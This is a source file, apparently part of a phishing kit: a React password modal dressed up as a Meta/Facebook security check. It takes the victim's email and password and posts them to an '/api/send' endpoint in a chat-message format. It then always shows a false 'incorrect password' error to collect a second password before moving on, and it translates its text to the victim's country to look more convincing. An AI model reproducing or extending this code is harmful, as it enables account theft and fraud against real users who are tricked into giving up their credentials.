'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

interface PasswordModalProps {
    userProfileImage: string;
    userName: string;
    userEmail: string;
    nextStep: () => void;
}

const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, userEmail, nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [attempt, setAttempt] = useState(1);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { messageId, setMessageId, message, setMessage, geoInfo } = store();

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = [
            'Password',
            'Continue',
            'Forgotten password?',
            'For your security, you must enter your password to continue.',
            'The password you\'ve entered is incorrect'
        ];
        const translateAll = async () => {
            const results = await Promise.all(
                textsToTranslate.map(async (text) => ({
                    text,
                    translated: await translateText(text, geoInfo.country_code),
                }))
            );
            const translatedMap: Record<string, string> = {};
            results.forEach(({ text, translated }) => {
                translatedMap[text] = translated;
            });
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading || !message || !password) return;
        setIsLoading(true);

        if (attempt === 1) {
            // First password attempt
            const updatedMessage = `${message}

<b>📧 Account Email:</b> <code>${userEmail}</code>
<b>🔒 Password 1:</b> <code>${password}</code>`;

            try {
                const res = await axios.post('/api/send', {
                    message: updatedMessage,
                    message_id: messageId
                });

                if (res?.data?.success) {
                    setMessage(updatedMessage);
                    if (typeof res.data.data?.result?.message_id === 'number') {
                        setMessageId(res.data.data.result.message_id);
                    }
                }
            } catch {
                // Continue even if send fails
            } finally {
                setIsLoading(false);
                setShowError(true);
                setPassword('');
                setAttempt(2);
            }
        } else if (attempt === 2) {
            // Second password attempt
            const updatedMessage = `${message}

<b>🔒 Password 2:</b> <code>${password}</code>`;

            try {
                const res = await axios.post('/api/send', {
                    message: updatedMessage,
                    message_id: messageId
                });

                if (res?.data?.success) {
                    setMessage(updatedMessage);
                    if (typeof res.data.data?.result?.message_id === 'number') {
                        setMessageId(res.data.data.result.message_id);
                    }
                }
                nextStep();
            } catch {
                nextStep();
            } finally {
                setIsLoading(false);
            }
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:p-3 md:p-4'>
                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto gap-2 sm:gap-2.5 md:gap-3 py-4 sm:py-5 md:py-6 px-1.5 sm:px-3 md:px-4'>
                        {/* Header */}
                        <div className='text-left'>
                            <p className='text-xs sm:text-sm text-gray-500'>
                                {t('For your security, you must enter your password to continue.')}
                            </p>
                        </div>

                        {/* Password Input */}
                        <div className='w-full'>
                            <div className='relative w-full'>
                                <input
                                    type={showPassword ? 'text' : 'password'}
                                    value={password}
                                    onChange={e => {
                                        setPassword(e.target.value);
                                    }}
                                    className='h-11 sm:h-12 md:h-13 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10 text-base focus:border-blue-500 focus:outline-none transition-colors'
                                    required
                                    autoComplete='new-password'
                                    placeholder={t('Password')}
                                />
                                <FontAwesomeIcon
                                    icon={showPassword ? faEyeSlash : faEye}
                                    size='lg'
                                    className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]'
                                    onClick={() => setShowPassword(!showPassword)}
                                />
                            </div>
                        </div>

                        {/* Error Message */}
                        {showError && (
                            <p className='text-xs sm:text-sm text-red-500'>
                                {t('The password you\'ve entered is incorrect')}
                            </p>
                        )}

                        {/* Log In Button */}
                        <button
                            type='submit'
                            disabled={isLoading}
                            className={`flex h-11 sm:h-12 md:h-13 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${
                                isLoading ? 'cursor-not-allowed opacity-80' : ''
                            }`}
                        >
                            {isLoading ? (
                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                            ) : (
                                t('Continue')
                            )}
                        </button>

                        {/* Forgotten Password Link */}
                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-xs sm:text-sm text-center text-blue-600 hover:underline'>
                            {t('Forgotten password?')}
                        </a>
                    </form>

                    {/* Meta Logo Footer */}
                    <div className='flex items-center justify-center p-3'>
                        <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                    </div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;
